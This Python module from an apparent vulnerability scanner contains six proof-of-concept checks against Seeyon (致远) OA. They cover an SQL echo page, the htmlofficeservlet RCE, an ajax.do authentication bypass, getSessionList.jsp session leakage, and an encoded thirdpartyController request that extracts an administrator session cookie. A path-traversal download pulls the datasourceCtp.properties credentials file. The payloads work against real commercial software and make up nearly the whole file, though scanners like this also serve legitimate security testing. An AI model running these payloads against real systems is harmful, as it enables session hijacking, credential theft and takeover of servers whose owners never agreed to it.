#!usr/bin/env python
#-*- coding:utf-8 _*-
"""
@author:ximi
@file: OaZhiyuan.py
@time: 2021/07/{DAY}
"""
import re
import sys
import threading
from module import globals
from core.verify import verify
from thirdparty import requests
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump


class OaZhiyuan:
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
    def oa_test_sql_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "致远OA A8-m 存在sql语句页面回显功能"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "致远OA 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "致远OA "
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "致远A8-V5协同管理软件 V6.1sp1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "sql"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = " 致远OA A8-m 存在sql语句页面回显功能,/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20@@datadi"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"

        payload='/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20@@datadi'
        try:
            response = requests.get(url=self.url+payload, headers=self.headers, verify=False, timeout=5)
            #print("\033[32m >> 获取的data:{}\033[0m".format(response.text))
            if response.status_code==200:
                # print("\033[32m >> 获取的cookie:{}\033[0m".format(response.text))
                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[sql] [可能存在SQL：" + payload + "] "
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def oa_CNVD_2019_19299_thirdpartyController_up_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "致远 OA A8 htmlofficeservlet RCE漏洞 CNVD-2019-19299"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "致远OA 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "致远OA "
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "致远A8-V5协同管理软件 V6.1sp1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "远程攻击者在无需登录的情况下可通过向 URL /seeyon/htmlofficeservlet POST 精心构造的数据即可向目标服务器写入任意文件，写入成功后可执行任意系统命令进而控制目标服务器。"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"

        self.payload = self.url + "/seeyon/htmlofficeservlet"
        try:
            response = requests.get(url=self.payload, headers=self.headers, verify=False, timeout=5)
            #print("\033[32m >> 获取的data:{}\033[0m".format(response.text))
            if "DBSTEP" in response.text:
                # print("\033[32m >> 获取的cookie:{}\033[0m".format(response.text))
                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[payload] [可能存在漏洞，请继续利用POC：" + self.payload + "] "
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()


    def oa_CNVD_2021_01627_thirdpartyController_up_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "致远OA ajax.do登录绕过 任意文件上传"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "致远OA 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "致远OA "
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "致远OA V8.0/7/6/5 "
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Login"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        self.payload = self.url + "/seeyon/thirdpartyController.do.css/..;/ajax.do"

        try:
            response = requests.get(url=self.payload, headers=self.headers, verify=False, timeout=5)
            print('DDDD',response.text)
            if response.status_code==200:
                #print("\033[32m >> 获取的cookie:{}\033[0m".format(response.text))
                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[payload] [可能存在漏洞，请继续利用POC：" + self.payload + "] "
                verify.scan_print(self.vul_info)

        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()


    def oa_getSessionList_session_login_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "致远OA getSessionList.jsp Session泄漏漏洞"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "致远OA 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "致远OA "
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "致远OA "
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Login"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"

        self.payload = self.url + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"

        try:
            response = requests.get(url=self.payload, headers=self.headers, verify=False, timeout=5)
            if response.status_code == 200:
                print("\033[32m >> 获取的cookie:{}\033[0m".format(response.text))
                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[payload] [可能存在，需要确认：" + self.payload + "] "
                verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])

        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def oa_thirdpartyController_session_getshell_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "致远OA thirdpartyController  Session泄露 任意文件上传漏洞"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "致远OA 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "致远OA "
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "致远OA "
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "getshell"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "致远OA通过发送特殊请求获取session，在通过文件上传接口上传webshell控制服务器"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        vuln_url = self.url + "/seeyon/thirdpartyController.do"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"

        try:
            response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
            if response.status_code == 200 and "a8genius.do" in response.text and 'set-cookie' in str(response.headers).lower():
                cookies = response.cookies
                cookies = requests.utils.dict_from_cookiejar(cookies)
                cookie = cookies['JSESSIONID']
                print("\033[32m >> 获取的cookie:{}\033[0m".format(cookie))

                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[cookie] [" + cookie + "] "
                verify.scan_print(self.vul_info)

        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()


    def oa_CNVD_2020_6242_webmail_dow_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "致远OA存在任意文件下载漏洞"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "致远OA 存在多個安全漏洞"
        self.vul_info["vul_numb"] = "OA"
        self.vul_info["vul_apps"] = "致远OA"
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "致远OA A6-V5+A8-V5+G6"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "DOW"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        vuln_url = self.url + "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        try:
            response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
            if "workflow" in response.text:
                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dow] [payload:" + vuln_url + "] "
                verify.scan_print(self.vul_info)

        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])

        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()